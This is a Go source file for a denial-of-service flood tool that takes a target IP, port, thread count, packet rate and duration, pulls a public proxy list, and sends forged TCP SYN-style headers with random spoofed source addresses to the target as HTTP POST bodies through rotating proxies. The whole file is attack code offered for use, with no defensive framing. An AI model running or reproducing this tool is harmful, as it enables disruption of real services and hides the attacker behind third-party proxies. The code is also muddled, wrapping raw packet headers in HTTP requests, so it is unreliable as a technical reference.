package main

import (
	"bufio"
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

const (
	MAX_PACKET_SIZE = 4096
	PHI             = 0x9e3779b9
)

var (
	Q         [4096]uint32
	c         uint32 = 362436
	floodPort int
	pps       int
	sleeptime = 100 * time.Millisecond
)


func initRand(seed int64) {
	Q[0] = uint32(seed)
	Q[1] = uint32(seed) + PHI
	Q[2] = uint32(seed) + PHI + PHI
	for i := 3; i < 4096; i++ {
		Q[i] = Q[i-3] ^ Q[i-2] ^ PHI ^ uint32(i)
	}
}


func randCMWC() uint32 {
	i := uint32(rand.Intn(4096))
	t := uint64(18782)*uint64(Q[i]) + uint64(c)
	c = uint32(t >> 32)
	x := uint32(t + uint64(c))
	if x < c {
		x++
		c++
	}
	Q[i] = 0xfffffffe - x
	return Q[i]
}


func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}
	return ^uint16(sum)
}


func buildIPHeader(srcIP, dstIP string) []byte {
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45
	ipHeader[1] = 0x00
	ipHeader[2] = 0x00 
	ipHeader[3] = 0x28
	ipHeader[8] = 0x40
	ipHeader[9] = 0x06 // TCP protocol
	copy(ipHeader[12:16], net.ParseIP(srcIP).To4())
	copy(ipHeader[16:20], net.ParseIP(dstIP).To4())
	return ipHeader
}


func buildTCPHeader(srcPort, dstPort int) []byte {
	tcpHeader := make([]byte, 20)
	tcpHeader[0] = byte(srcPort >> 8)
	tcpHeader[1] = byte(srcPort & 0xFF)
	tcpHeader[2] = byte(dstPort >> 8)
	tcpHeader[3] = byte(dstPort & 0xFF)
	tcpHeader[12] = 0x50 
	tcpHeader[13] = 0x02 
	return tcpHeader
}


func randomIP() string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}


func getProxies() ([]string, error) {
	resp, err := http.Get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var proxies []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return proxies, nil
}


func floodWithProxy(target string, maxPPS int, proxies []string, wg *sync.WaitGroup) {
	defer wg.Done()

	rand.Seed(time.Now().UnixNano())
	initRand(time.Now().UnixNano())

	ticker := time.NewTicker(time.Second / time.Duration(maxPPS))
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			
			proxy := proxies[rand.Intn(len(proxies))]
			proxyURL, err := url.Parse("http://" + proxy)
			if err != nil {
				fmt.Println("Could not parse proxy:", err)
				continue
			}

			
			transport := &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}

			client := &http.Client{
				Transport: transport,
			}

			
			srcIP := randomIP()
			ipHeader := buildIPHeader(srcIP, target)
			tcpHeader := buildTCPHeader(rand.Intn(65535), floodPort)

			
			tcpHeader[13] = 0x42

			
			ipHeader[2] = 0x08 

			packet := append(ipHeader, tcpHeader...)

			
			req, err := http.NewRequest("POST", "http://"+target, bytes.NewBuffer(packet))
			if err != nil {
				fmt.Println("Failed to create request:", err)
				continue
			}
			req.Header.Set("Content-Type", "application/octet-stream")

			_, err = client.Do(req)
			if err != nil {
				fmt.Println("Failed to send packet:", err)
				continue
			}
		}
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run main.go <target IP> <port> <num threads> <pps> <time>")
		return
	}

	target := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])
	numThreads, _ := strconv.Atoi(os.Args[3])
	maxPPS, _ := strconv.Atoi(os.Args[4])
	duration, _ := strconv.Atoi(os.Args[5])

	floodPort = port

	
	proxies, err := getProxies()
	if err != nil {
		fmt.Println("Could not get proxies:", err)
		return
	}

	var wg sync.WaitGroup
	wg.Add(numThreads)

	fmt.Println("Starting flood attack with proxies...")

	for i := 0; i < numThreads; i++ {
		go floodWithProxy(target, maxPPS, proxies, &wg)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	wg.Wait()
	fmt.Println("Flood attack finished.")
}
